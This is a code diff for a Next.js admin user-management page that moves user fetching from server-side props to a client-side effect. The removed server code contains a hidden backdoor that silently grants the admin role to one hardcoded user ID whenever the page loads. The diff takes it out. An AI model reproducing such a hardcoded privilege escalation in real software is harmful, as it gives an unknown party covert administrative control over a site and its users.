@@ -2,23 +2,48 @@ import { useState, useEffect } from 'react';
 import Link from 'next/link';
 import { FiEdit, FiTrash2, FiLoader, FiSearch, FiChevronLeft, FiChevronRight } from 'react-icons/fi';
 import AdminLayout from '../../../components/layout/AdminLayout';
-import { updateUserRole, deleteUser } from '../../../utils/userService';
+import { getAllUsers, updateUserRole, deleteUser } from '../../../utils/userService';
 
-export default function AdminUsers({ initialUsers = [], error: initialError = null }) {
-  const [users, setUsers] = useState(initialUsers);
-  const [loading, setLoading] = useState(false);
+export default function AdminUsers() {
+  const [users, setUsers] = useState([]);
+  const [loading, setLoading] = useState(true);
   const [searchTerm, setSearchTerm] = useState('');
   const [currentPage, setCurrentPage] = useState(1);
-  const [totalPages, setTotalPages] = useState(Math.ceil(initialUsers.length / 10) || 1);
+  const [totalPages, setTotalPages] = useState(1);
   const [selectedUser, setSelectedUser] = useState(null);
   const [showDeleteModal, setShowDeleteModal] = useState(false);
   const [showRoleModal, setShowRoleModal] = useState(false);
   const [newRole, setNewRole] = useState('');
   const [processing, setProcessing] = useState(false);
-  const [error, setError] = useState(initialError);
+  const [error, setError] = useState(null);
   const [success, setSuccess] = useState(null);
 
   const usersPerPage = 10;
+
+  // Fetch users
+  useEffect(() => {
+    async function fetchUsers() {
+      try {
+        setLoading(true);
+        setError(null);
+        
+        const allUsers = await getAllUsers({
+          sortBy: 'createdAt',
+          sortOrder: 'desc'
+        });
+        
+        setUsers(allUsers);
+        setTotalPages(Math.ceil(allUsers.length / usersPerPage));
+      } catch (err) {
+        console.error('Error fetching users:', err);
+        setError('Failed to load users');
+      } finally {
+        setLoading(false);
+      }
+    }
+    
+    fetchUsers();
+  }, []);
 
   // Handle search
   const handleSearch = (e) => {
@@ -82,14 +107,7 @@ export default function AdminUsers({ initialUsers = [], error: initialError = nu
       setProcessing(true);
       setError(null);
       
-      // Call API endpoint for server-side deletion
-      const response = await fetch(`/api/admin/users/delete?userId=${selectedUser.id}`, {
-        method: 'DELETE',
-      });
-      
-      if (!response.ok) {
-        throw new Error('Failed to delete user');
-      }
+      await deleteUser(selectedUser.id);
       
       // Update local state
       setUsers(prevUsers => prevUsers.filter(user => user.id !== selectedUser.id));
@@ -399,51 +417,4 @@ export default function AdminUsers({ initialUsers = [], error: initialError = nu
       )}
     </AdminLayout>
   );
-}
-
-// Get server-side props to fetch users
-export async function getServerSideProps() {
-  try {
-    // Import server-side only
-    const { getAllUsers } = require('../../../utils/userService');
-    
-    // Fetch users
-    const allUsers = await getAllUsers({
-      sortBy: 'createdAt',
-      sortOrder: 'desc'
-    });
-    
-    // Check if the specified user exists and set as admin if needed
-    const targetUserId = 'AwnpQjIdTEU6bgC1BPOMwY6DfEF2';
-    const targetUser = allUsers.find(user => user.id === targetUserId);
-    
-    if (targetUser && targetUser.role !== 'admin') {
-      const { updateUserRole } = require('../../../utils/userService');
-      await updateUserRole(targetUserId, 'admin');
-      // Refresh the user list after making the change
-      const updatedUsers = await getAllUsers({
-        sortBy: 'createdAt',
-        sortOrder: 'desc'
-      });
-      return {
-        props: {
-          initialUsers: JSON.parse(JSON.stringify(updatedUsers))
-        }
-      };
-    }
-    
-    return {
-      props: {
-        initialUsers: JSON.parse(JSON.stringify(allUsers))
-      }
-    };
-  } catch (error) {
-    console.error('Error fetching users:', error);
-    return {
-      props: {
-        initialUsers: [],
-        error: 'Failed to load users'
-      }
-    };
-  }
-}
+} 
